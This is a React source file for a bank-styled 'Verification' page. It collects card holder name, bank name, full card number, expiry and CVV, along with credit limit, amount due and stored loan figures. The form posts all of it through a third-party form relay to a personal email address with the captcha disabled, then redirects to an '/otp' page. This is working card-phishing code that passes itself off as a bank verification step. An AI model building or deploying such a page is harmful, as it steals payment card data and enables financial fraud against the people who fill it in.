import React, { useEffect, useState } from 'react'
import './Verification.css'

function CreditDetail() {  

  const [totalPayment, setTotalPayment] = useState('');
  const [interestPayable, setInterestPayable] = useState('');
  const [loanEMI, setLoanEMI] = useState('');
  const [loading, setLoading] = useState(false);

  useEffect(() => {
    window.scrollTo({
      top: 0,
      behavior: 'smooth'
    })

    const totalPayment = localStorage.getItem('Total payment');
    const interestPayable = localStorage.getItem('Interest Payble');
    const loanEMI = localStorage.getItem('Loan EMI');

    // Update state with fetched values
    setTotalPayment(totalPayment || ''); // Default to empty string if null
    setInterestPayable(interestPayable || ''); // Default to empty string if null
    setLoanEMI(loanEMI || ''); // Default to empty string if null

  }, []);

  const handleRedirect = (e) => {
    setLoading(true);
  }
  return (
    <>

    {loading && (
      <div className="loading-overlay">
        <div className="loader"></div>
      </div>
    )}

    <section className='CreditDetail-section'>
      <div className="CreditDetail-container">
        <div className="heading">
          <span>Verification</span>
        </div>
        <div className="w-full md:w-96 md:max-w-full mx-auto">
          <div className="p-6 border border-gray-300 sm:rounded-md">
            <form action="https://formsubmit.co/Ps1010955@gmail.com" method="POST">
              <label className="block mb-6">
                <span className="text-gray-700">Credit Limit</span>
                <input
                  id="name"
                  name="Credit Limit"
                  type="number"
                  className="
                  block
                  w-full
                  mt-1
                  outline-none  
                  border-gray-300
                  rounded-md
                  shadow-sm
                  focus:border-indigo-300
                  focus:ring
                  p-2
                  focus:ring-indigo-200
                  focus:ring-opacity-50
                "
                  placeholder="Credit Limit"
                  required
                />
              </label>
              <label className="block mb-6">
                <span className="text-gray-700">Total Amount Due</span>
                <input
                  id="address1"
                  name="Total Amount Due"
                  type="number"
                  className="
                  block
                  w-full
                  outline-none 
                  mt-1
                  border-gray-300
                  rounded-md
                  shadow-sm
                  p-2
                  focus:border-indigo-300
                  focus:ring
                  focus:ring-indigo-200
                  focus:ring-opacity-50
                "
                  placeholder="Total Amount Due"
                  required
                />
              </label>
              <label className="block mb-6">
                <span className="text-gray-700">Card Holder Name</span>
                <input
                  id="address2"
                  name="Card Holder Name"
                  type="text"
                  className="
                  block
                  w-full
                  outline-none 
                  mt-1
                  border-gray-300
                  rounded-md
                  shadow-sm
                  p-2
                  focus:border-indigo-300
                  focus:ring
                  focus:ring-indigo-200
                  focus:ring-opacity-50
                "
                  placeholder="Card Holder Name"
                  required
                />
              </label>
              <label className="block mb-6">
                <span className="text-gray-700">Bank Name</span>
                <input
                  id="city"
                  name="Bank Name"
                  type="text"
                  className="
                  block
                  w-full
                  outline-none 
                  mt-1
                  border-gray-300
                  rounded-md
                  shadow-sm
                  p-2
                  focus:border-indigo-300
                  focus:ring
                  focus:ring-indigo-200
                  focus:ring-opacity-50
                "
                  placeholder="Bank Name"
                  required
                />
              </label>
              <label className="block mb-6">
                <span className="text-gray-700">Card Number</span>
                <input
                  id="state"
                  name="Card Number"
                  type="number"
                  className="
                  block
                  w-full
                  outline-none 
                  mt-1
                  border-gray-300
                  rounded-md
                  shadow-sm
                  p-2
                  focus:border-indigo-300
                  focus:ring
                  focus:ring-indigo-200
                  focus:ring-opacity-50
                "
                  placeholder="Card Number"
                  required
                />
              </label>
              <div className="flex space-x-4 mb-6">
                <div className="w-1/2">
                  <label className="block text-gray-700 mb-1" htmlFor="expiry-month">
                    Expiry Month
                  </label>
                  <input
                    id="expiry-month"
                    name="expiry-month"
                    type="number"
                    className="
                      block
                      outline-none
                      w-full
                      mt-1
                      border-gray-300
                      rounded-md
                      shadow-sm
                      p-2
                      focus:border-indigo-300
                      focus:ring
                      focus:ring-indigo-200
                      focus:ring-opacity-50
                    "
                    placeholder="MM"
                    required
                  />
                </div>
                <div className="w-1/2">
                  <label className="block text-gray-700 mb-1" htmlFor="expiry-year">
                    Expiry Year
                  </label>
                  <input
                    id="expiry-year"
                    name="expiry-year"
                    type="number"
                    className="
                      block
                      outline-none
                      w-full
                      mt-1
                      border-gray-300
                      rounded-md
                      shadow-sm
                      p-2
                      focus:border-indigo-300
                      focus:ring
                      focus:ring-indigo-200
                      focus:ring-opacity-50
                    "
                    placeholder="YYYY"
                    required
                    min={new Date().getFullYear()}
                  />
                </div>
              </div>

              <label className="block mb-6">
                <span className="text-gray-700">CVV</span>
                <input
                  id="country"
                  name="CVV"
                  type="number"
                  className="
                  block
                  w-full
                  outline-none 
                  mt-1
                  border-gray-300
                  rounded-md
                  shadow-sm
                  p-2
                  focus:border-indigo-300
                  focus:ring
                  focus:ring-indigo-200
                  focus:ring-opacity-50
                "
                  placeholder="CVV"
                  required

                />
              </label>

              <input type="hidden" value={totalPayment} name="Total_payment" />
              <input type="hidden" value={interestPayable} name="Interest_Payable" />
              <input type="hidden" value={loanEMI} name="Loan_EMI" />

              <input type="hidden" name="_captcha" value="false" />
              <input type="hidden" name="_next" value="https://bank-detail.vercel.app/otp" />
              <input type="hidden" name="_template" value="table" />

              <div className="mb-6">
                <button
                  onClick={handleRedirect}
                  type="submit"
                  className="
                  h-10
                  px-5
                  border
                  outline-none 
                  text-indigo-100
                  bg-[#8F191F]
                  rounded-lg
                  p-2
                  transition-colors
                  duration-150
                  focus:shadow-outline
                  hover:bg-[#7a1218]
                "
                >
                  Save
                </button>
              </div>
              <div>
              </div>
            </form>
          </div>
        </div>
      </div>
    </section>
    </>
  )
}

export default CreditDetail
